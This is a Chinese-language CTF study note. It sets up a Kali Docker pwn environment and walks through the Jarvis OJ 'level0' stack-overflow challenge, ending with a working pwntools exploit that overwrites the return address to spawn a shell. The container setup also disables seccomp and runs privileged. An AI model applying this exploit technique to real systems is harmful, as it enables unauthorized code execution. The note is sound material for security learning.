# 环境配置

```
#配置Kali的docker容器

#下载kali镜像
docker pull kalilinux/kali-rolling --platform linux/amd64
【如果不带参数，默认使用arm版aarch64】
#启动容器
docker run --privileged --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -itd -p 22:22 kalilinux/kali-rolling

#进入容器，配置兼容32位程序
docker exec -it 1b93 /bin/bash
dpkg --add-architecture i386

#设置国内源
echo "# 官方源
# deb http://http.kali.org/kali kali-rolling main non-free contrib
# deb-src http://http.kali.org/kali kali-rolling main non-free contrib
#根据需要自己选一个，中科大的还可以
#中科大
deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
#阿里云
#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
#清华大学
#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
#浙大
#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
#东软大学
#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib
#重庆大学
#deb http://http.kali.org/kali kali-rolling main non-free contrib
#deb-src http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/source.list

#安装依赖
apt-get update
# apt-get install python2 python3 python2-dev python3-dev python3-pip git cmake gcc clang libncurses5-dev qemu-user-static libssl-dev libffi-dev build-essential curl
apt-get install python3 python3-dev python3-pip git cmake gcc libncurses5-dev libssl-dev libffi-dev build-essential curl qemu-user-static

#安装unicorn
python3 -m pip install unicorn==1.0.2rc1
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

#安装peda
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

#安装pwntools
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade git+https://github.com/Gallopsled/pwntools.git@dev

#编译安装vim
git clone https://github.com/vim/vim.git
cd vim/src
./configure --with-features=huge --enable-pythoninterp=yes --enable-cscope --enable-fontset --enable-python3interp=yes --with-python-config-dir=/usr/lib/python3.11/config-3.11-x86_64-linux-gnu/ --enable-multibyte --prefix=/usr/local/vim/
make
make install

/usr/local/vim/bin/vim ~/.bashrc
在最后加上一行：
export PATH=$PATH:/usr/local/vim/bin/
alias sudo='sudo env PATH=$PATH'
然后 source .bashrc 使配置生效

#配置vim，安装自动补全插件
curl -fLo ~/.vim/autoload/plug.vim --create-dirs   https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim

vim ~/.vimrc 

call plug#begin('~/.vim/plugged')
Plug 'Valloric/YouCompleteMe'
call plug#end()
" F5 运行
map <F5> :call CompileRunGcc()<CR>
func! CompileRunGcc()
    exec "w" 
    if &filetype == 'c' 
        exec "!g++ % -o %<"
        exec "!./%<"
    elseif &filetype == 'cpp'
        exec "!g++ % -o %<"
        exec "!./%<"
    elseif &filetype == 'java' 
        exec "!javac %" 
        exec "!java %<"
    elseif &filetype == 'sh'
        :!time bash %
    elseif &filetype == 'python'
        exec "!python3 %"
    elseif &filetype == 'html'
        exec "!firefox % &"
    elseif &filetype == 'php'
        exec "!php % &"
    elseif &filetype == 'go'
        exec "!go build %<"
        exec "!go run %"
    elseif &filetype == 'mkd'
        exec "!~/.vim/markdown.pl % > %.html &"
        exec "!firefox %.html &"
    endif
endfunc

打开vim，输入 :PlugInstall 初步安装插件【可能部分失败】

cd ~/.vim/plugged/YouCompleteMe/
python3 install.py --force-sudo

#将配置好的容器做成镜像，上传至dockerhub
docker commit -a "F4k34rch3r" -m "pwntools" -p 1b93 kalipwntools:v1
docker login
docker tag kalipwntools:v1 f4k34rch3r/kalipwntools4applesilicon:0.1
docker push f4k34rch3r/kalipwntools4applesilicon:0.1
```

# 基础练习

https://www.jarvisoj.com/challenges

## 基础知识

寄存器

| 描述         | 32位      | 64位       |
| ------------ | --------- | ---------- |
| 通用寄存器组 | eax       | rax        |
|              | ecx       | rcx        |
|              | edx       | rdx        |
|              | ebx       | rbx        |
|              | esp       | rsp        |
|              | ebp       | rbp        |
|              | esi       | rsi        |
|              | edi       | rdi        |
|              | -         | r8~r15     |
| 浮点寄存器组 | st0~st7   | st0~st7    |
| XMM寄存器组  | XMM0~XMM7 | XMM0~XMM15 |

PWN解题相关寄存器

32位：

esp 栈顶指针

ebp 栈底指针

64位：

rsp 栈顶指针

rbp 栈底指针

rdi rsi rdx rcx r8 r9 函数调用的前六个参数，再多就存栈里。

## level0

level0.b9ded3801d6dd36a97468e128b81a65d

```
./level0.b9ded3801d6dd36a97468e128b81a65d 
Hello, World
```

file查看，为64位程序。

```
file level0.b9ded3801d6dd36a97468e128b81a65d    
level0.b9ded3801d6dd36a97468e128b81a65d: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped

checksec ./level0.b9ded3801d6dd36a97468e128b81a65d 
[*] '/root/level0.b9ded3801d6dd36a97468e128b81a65d'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ida打开，F5反编译。

main函数：

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  write(1, "Hello, World\n", 0xDuLL);
  return vulnerable_function(1LL);
}
```

vulnerable_function函数：

```
ssize_t vulnerable_function()
{
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  return read(0, buf, 0x200uLL);
}
```

此处存在栈溢出，ret偏移量为0x80+8。

另有系统调用的函数：

```
int callsystem()
{
  return system("/bin/sh");
}
```

tab切换汇编，看到函数地址 0x0000000000400596

构造栈溢出，跳转到此地址即可得到shell

```
from pwn import *

context.log_level = 'DEBUG'
LOCAL = 1
target = './level0.b9ded3801d6dd36a97468e128b81a65d'
remote_addr = 'pwn2.jarvisoj.com'
remote_port = 9881
elf = ELF('./' + target)
context.terminal = ['tmux','splitw','-h']
context.binary = './' + target
if LOCAL:
    p = process('./' + target)
else:
    p = remote(remote_addr,remote_port)
def DEBUG(bps = []):
    gdb.attach(p, ''.join(['b *{:#x}\n'.format(b) for b in bps]) + 'c\n')

#DEBUG([])
#fpattern = open('./test')
#payload = fpattern.readline()
#fpattern.close()
ret_offset = 128 + 8
syscall = 0x0000000000400596
payload = b''
payload += b'A' * ret_offset
payload += p64(syscall)
p.sendline(payload)
p.interactive()
'''
缓冲区大小0x80，64位栈底指针rbp占8，ret偏移量为0x80+8
+--------------------+
|    buffer start    |   
+--------------------+
|       buffer       |   
+--------------------+
|       buffer       |   
+--------------------+
|       buffer       |   
+--------------------+
|     buffer end     |   
+--------------------+
|        rbp         |   
+--------------------+
|        ret         |   
+--------------------+
'''
```

